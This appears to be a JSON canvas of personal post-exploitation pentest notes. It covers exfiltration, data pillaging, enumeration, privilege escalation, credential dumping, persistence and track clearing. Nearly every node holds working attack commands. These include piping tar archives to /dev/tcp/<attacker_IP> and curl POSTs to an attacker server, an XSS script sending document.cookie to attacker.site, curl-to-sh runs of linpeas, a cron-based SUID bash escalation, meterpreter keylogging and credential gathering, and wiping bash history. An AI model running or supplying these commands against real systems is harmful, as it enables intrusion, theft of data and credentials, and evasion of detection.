{
	"nodes":[
		{"id":"07176cf521dcc440","type":"text","text":"# Exfil over TCP Socket with EBCDIC and Base64\n```bash\n$ nc -nlvp 80 > datafolder.tmp\n$ tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/<attacker_IP>/80\n$ dd conv=ascii if=datafolder.tmp |base64 -d > datafolder.tar\n$ tar xf datafolder.tar\n```","x":4340,"y":-1240,"width":900,"height":200},
		{"id":"c77dcfc2eeab3e4f","type":"text","text":"# Exfil via POST Request over HTTPS\n```bash\n$ cat contact.php\n<?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?> # write data being received as a POST request, to file \n```\n```bash\n$ curl --data \"$(tar zcf - /tmp/datafolder | base64)\" https://<attacker_server>/contact.php\n```\n```bash\n# From the victim machine, we issue a curl command that will send a POST request consisting of the tar'd and base64-encoded data from the victims’ /tmp/datafolder directory. We send that POST request to our attacker- controlled PHP web servers’ contact.php file over SSL which will write a copy of the base64-encoded tar archive to a /tmp/datafolder.base64 file on our attacker system:\n$ curl --data \"$(tar zcf - /tmp/datafolder | base64)\" https://<attacker_server>/contact.php\n```\n```bash\n# decode data\n$ cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar\n```","x":4340,"y":-760,"width":900,"height":440},
		{"id":"eb539273e4a062de","type":"text","text":"# Exfil over SSH\n```bash\n$ tar zcf - /tmp/datafolder | ssh root@<attacker_IP> \"cd /tmp; tar zxpf -\"\n```","x":4340,"y":-980,"width":900,"height":140},
		{"id":"caeb52fcabd3fc85","type":"text","text":"# dns cache\n```powershell\ncmd> ipconfig /displaydns\n```\n# netstat\n```powershell\n$ netstat -ano # display active network connections and listening ports on a computer, along with associated processes and their Process IDs (PIDs).\n```\n","x":5692,"y":-1242,"width":776,"height":322},
		{"id":"eabcff422b33e01a","type":"text","text":"# Mapping the Internal Network","x":5840,"y":-1565,"width":480,"height":91,"color":"1"},
		{"id":"68af55f90af92c19","type":"text","text":"# $ veil\ntool designed to generate metasploit payloads that bypass common anti-virus solutions. It replaces the package veil-evasion","x":7005,"y":-1360,"width":515,"height":118},
		{"id":"14286212928c4da2","type":"text","text":"# Local enumeration scripts\n## $ msf > scraper\n```bash\nmeterpreter> run scraper\n```\n## $ msf > winenum\n```bash\nmeterpreter> run winenum\n```\nThe `winenum` script will run several commands such as `arp`, `net`, `netstat`, `netsh`, and `wmic` among other commands on the target machine and store the results on our local system.\n## $ msf > screenshot\n```bash\nmeterpreter> screenshot\n```\n## $ msf > keylogger\n```bash\n# meterpreter> migrate to winlogon.exe process to log the credentials typed when the user unlocks the screen\nmeterpreter> keyscan_start\n# meterpreter> keyscan_dump\n# meterpreter> keyscan_stop\n\nmeterpreter> kaylogrecorder -h # migrates automaticaly, stores keys in local file\n```\n## $ msf > gather/... (data)\n```bash\nmeterpreter> run post/windows/gather/...\nmeterpreter> run post/windows/gather/credentials/...\nmeterpreter> run post/multi/gather/...\n```","x":2400,"y":-1240,"width":700,"height":1001},
		{"id":"c92f7c7612247586","type":"text","text":"# PILLAGING/DATA HARVESTING","x":2750,"y":-1520,"width":512,"height":99,"color":"1"},
		{"id":"ebc7931268570c9d","type":"text","text":"# dumping stored firefox credentials\n```bash\n/home/user/.mozilla/firefox/....default\n./login.json\n```\nhttps://github.com/unode/firefox_decrypt","x":3120,"y":-1240,"width":540,"height":240},
		{"id":"f98f698c696f243e","type":"text","text":"# Exfiltration over DNS\n## $ iodine","x":3730,"y":-1220,"width":540,"height":161},
		{"id":"d483b380257609fb","type":"text","text":"PHP script that captures some information about visitors to website and logs it into a file named `jar.txt`\n```php\n<? php \n\n$ip = $_SERVER['REMOTE_ADDR']; # get IP of visitor\n$browser = $_SERVER['HTTP_USER_AGENT']; # get useragent \n\n$fp = fopen('jar.txt', 'a'); # open file in append mode\n\nfwrite($fp, $ip.' '.$browser.\" \\n\"); # write above data to file\nfwrite($fp, urldecode($_SERVER['QUERY_STRING']). \" \\n\\n\"); # writes the decoded query string (parameters passed in the URL) to the file\nfclose($fp); # close file handler\n\n?> \n```\n\nUse:\n```\nhttp://<IP>:<port>/<script.php>?<x=data>\nhttp://attacker/scritp.php?data=test\n```\n```JavaScript\n// XSS\n<script>\n  var i = new Image();\n  i.src = \"http://attacker.site/script.php?cookie=\" + escape(document.cookie);\n</script>\n```\n","x":3730,"y":-1000,"width":540,"height":640},
		{"id":"3e5e38713dcf1717","type":"text","text":"# EXFILTRATION","x":4000,"y":-1481,"width":340,"height":81,"color":"1"},
		{"id":"3d6cd095df1d8d04","type":"text","text":"# AV Evasion","x":7123,"y":-1600,"width":280,"height":60,"color":"1"},
		{"id":"5b02ab2a3bef42ad","type":"text","text":"# Automatic Local Enumeration\n## $ [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master)\n\n```bash\n# Local network\n$ sudo python3 -m http.server 80 #Host\n$ curl 10.10.10.10/linpeas.sh | sh #Victim\n```\n\n```bash\n# Without curl\n$ sudo nc -q 5 -lvnp 80 < linpeas.sh #Host\n$ cat < /dev/tcp/10.10.10.10/80 | sh #Victim\n```\n\n```bash\n# Excute from memory and send output back to the host\n$ nc -lvnp 9002 | tee linpeas.out #Host\n$ curl 192.168.45.243:8000/linpeas.sh | sh | nc 192.168.45.243 9002 #Victim\n```\n### $ [Linux-Exploit-Suggester (.sh)](https://github.com/mzet-/linux-exploit-suggester)\nalready inside of linpeas\n\n## $ [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)\n\n## $ [LinEnum (.sh)](https://github.com/rebootuser/LinEnum)\n\nScripted Local Linux Enumeration & Privilege Escalation Checks\n\n## $ [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)\nhttps://pentestmonkey.net/tools/audit/unix-privesc-check\n\n\n## $ msf > enum_configs\n```bash\nmsf> use post/linux/gather/enum_configs\n```\n","x":-2880,"y":-1619,"width":680,"height":940,"color":"3"},
		{"id":"9e8c2eff4d62c916","type":"text","text":"# Privilege Escalation\n\n## $ traitor\n\nAutomatically exploit low-hanging fruit to pop a root shell\nhttps://github.com/liamg/traitor\nhttps://github.com/liamg/traitor/releases\n\n## Cron jobs\n\n```bash\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>\n#Wait cron job to be executed\n/tmp/bash -p #The effective uid and gid to be set to the real uid and gid\n```\n\n## SUID binaries\n\n```bash\n$ chmod u+s /bin/cp # add SUID\n$ find / -perm -u=s -type f 2>/dev/null # find SUID binaries\n```\n\n## diy\n\n```bash\nfind / -not -type l -perm -o+w # identify files with the write permission applied for all user accounts\nopenssl passwd -1 -salt abc password # hash hasła password, salt abc, hash MD5\nfind / -user root -perm -4000 -exec ls -ldb {} \\; # finding setuid program\nsudo -l # misconfigured sudo\n```\n\n","x":-2180,"y":-1619,"width":680,"height":840,"color":"3"},
		{"id":"7a8d5397c0d74427","type":"link","url":"https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/","x":-1440,"y":-1599,"width":680,"height":400,"color":"3"},
		{"id":"b1173e209f2c5e10","type":"text","text":"# obtain user credentials from sudo and ssh proceses directly from memory as root\nhttps://github.com/blendin/3snake\nlistens for proc events related to sudo or sshd proceses\n```bash\n# download and compile\n\n$ ./3snake # Run in current terminal\n$ ./3snake -d -o \"/tmp/output_file.txt\" # Daemonize and dump output to file\n```\n```bash\n# to test login via ssh\n$ ssh root@victim\n```","x":-1440,"y":-1139,"width":890,"height":380,"color":"3"},
		{"id":"17d76ce99b92bca8","type":"text","text":"\n# Clearing Your Tracks\n\n```bash\ncat /dev/null > ~/.bash_history # bash history file\n```","x":-4160,"y":-1619,"width":567,"height":160,"color":"3"},
		{"id":"84d5876fa483f60a","type":"text","text":"# Manual Local enumeration \n```bash\n$ cat /etc/resolv.conf # DNS Server\n$ ifconfig -a # List Current Network Interface Configuration\n$ route # Current Network Route Information\n$ traceroute -n <ip address> # Trace our route across network segments\n$ arp -a # List our ARP Cache \n$ netstat -auntp # Established and Listening TCP/UDP Ports/Connections\n$ ss -twurp # Listing active connections, processes, users and bytes\n$ nmap -sT -p5555 portquiz.net # Check outbound firewall rules\n\n$ id # Current User Information\n$ uname -a # Kernel Version\n$ grep $USER /etc/passwd # Current User Information from /etc/passwd \n$ lastlog # Most Recent Logins \n$ w # Who is currently logged onto the system\n$ last # Last Logged On Users\n$ for user in $(cat /etc/passwd | cut -fl -d\":\"); do id $user; done # All Users Including UID and GID Information\n$ cat /etc/passwd |cut -f1,3,4 - d\":\" |grep \"0:0\" |cut -fl -d\":\" |awk '{print $1}' # List all UID O (root) Accounts\n$ cat /etc/passwd #  Read passwd File\n$ cat /etc/shadow # Check readability of the shadow file \n$ cat /etc/sudoers # Can we read the /etc/sudoers file?\n$ sudo -l # What can we sudo without a password?\n$ cat /root/.bash_history # Can we read roots .bash_history file? \n$ find /home/* -name *.*history* - print 2> /dev/null # Can we read any other users’ .bash_history files? \n$ cat /etc/issue       # Operating System info\n$ cat /etc/*-release      # Operating System info\n\n$ sudo -l |grep vim # Can we sudo known binaries that allow breaking outinto a shell? \n$ sudo -l |grep nmap \n$ sudo -1 |grep vi\n$ ls -als /root/ # Can we list root’s home directory? \n$ echo $PATH # Current SPATH environment variable \n$ cat /etc/crontab && ls -als /etc/cron* # List all cron jobs \n$ find /etc/cron* -type f -perm o+w -exec ls -l {} \\; # Find world-writeable cron jobs \n$ ps auxwww # List running processes \n$ ps -u root #  List all processes running as root\n$  ps -u $USER # List all processes running as current user x iN&\n\n$ find / -perm -4000 -type f 2>/dev/null #  Find SUID files \n$ find / -uid 0 -perm -4000 -type f 2>/dev/nulL # Find SUID files owned by root \n$ find / -perm -2000 -type -f 2>/dev/null # Find GUID files \n$ find -perm -2 -type f 2>/dev/null # Find world-writable files\n$ ls -al /etc/*.conf # List all conf files in /etc/ \n$ grep pass* /etc/*.conf #  Find conf files that contain the string “pass*” \n$ lsof -n #  List open files\n$ sudo -V # Common software versions\n$ httpd -v # Common software versions\n$ apache2 -v # Common software versions \n$ mysql -V # Common software versions\n$ sendmail -d0.1 # Common software versions\n$ ps -aux | awk '(print $11}' |xargs -r ls -la 2>/dev/null |awk '!x[$0]++' # Print process binaries/paths and permissions \n$ dpkg -l# query installed packages\n```","x":-3560,"y":-1619,"width":680,"height":1560,"color":"3"},
		{"id":"bca262c94c0d4a87","type":"text","text":"# Linux Credential Dumping\n```bash\n/etc/init.d/postgresql start\nexploit/unix/ftp/proftpd_133c_backdoor\npost/linux/gather/hashdump\nauxiliary/analyze/crack_linux\n```\n# Dumping & Cracking Hashes\n\n```bash\ncat /etc/shadow\n\nmsf> use post/linux/gather/hashdump\n```","x":-2180,"y":-760,"width":680,"height":400,"color":"3"},
		{"id":"6def9733adc2229d","type":"text","text":"\n# ssh key\n\n```bash\n$ scp student@192.37.104.3:~/.ssh/id_rsa .\n$ chmod 400 id_rsa\n$ ssh -i id_rsa student@192.37.104.3\n```\n\n# cron jobs\n\n```bash\n$ echo \"* * * * * cd /home/student/ && python -m SimpleHTTPServer\" > $ cron # cron job, tworzy serwer http w folderze domowym\n$ crontab -i cron\n$ crontab -l\n```\n","x":-440,"y":-1369,"width":607,"height":493,"color":"3"},
		{"id":"5b662b1fe697e728","type":"link","url":"https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/#unix-shell-configuration-modification","x":200,"y":-1369,"width":880,"height":406},
		{"id":"25445a6ba252524c","type":"link","url":"https://pberba.github.io/security/","x":200,"y":-929,"width":880,"height":760},
		{"id":"5cd56421b658e914","type":"link","url":"https://sushant747.gitbooks.io/total-oscp-guide/content/persistence.html","x":200,"y":-129,"width":880,"height":640},
		{"id":"d0d7f60a03068a1b","type":"text","text":"# Linux Persistence","x":-73,"y":-1599,"width":393,"height":110}
	],
	"edges":[
		{"id":"fd278f52d2aead6a","fromNode":"d0d7f60a03068a1b","fromSide":"bottom","toNode":"6def9733adc2229d","toSide":"top"},
		{"id":"e7b460d169e84516","fromNode":"d0d7f60a03068a1b","fromSide":"bottom","toNode":"5b662b1fe697e728","toSide":"top"},
		{"id":"da2f036fde8301bc","fromNode":"3e5e38713dcf1717","fromSide":"bottom","toNode":"07176cf521dcc440","toSide":"top"},
		{"id":"c161623bf77223c3","fromNode":"eabcff422b33e01a","fromSide":"bottom","toNode":"caeb52fcabd3fc85","toSide":"top"},
		{"id":"317da0caf7bea779","fromNode":"3d6cd095df1d8d04","fromSide":"bottom","toNode":"68af55f90af92c19","toSide":"top"},
		{"id":"ce3b5a5e80abffeb","fromNode":"c92f7c7612247586","fromSide":"bottom","toNode":"14286212928c4da2","toSide":"top"},
		{"id":"f5919a0327a8612b","fromNode":"c92f7c7612247586","fromSide":"bottom","toNode":"ebc7931268570c9d","toSide":"top"},
		{"id":"3764672e5fd617a7","fromNode":"3e5e38713dcf1717","fromSide":"bottom","toNode":"f98f698c696f243e","toSide":"top"}
	]
}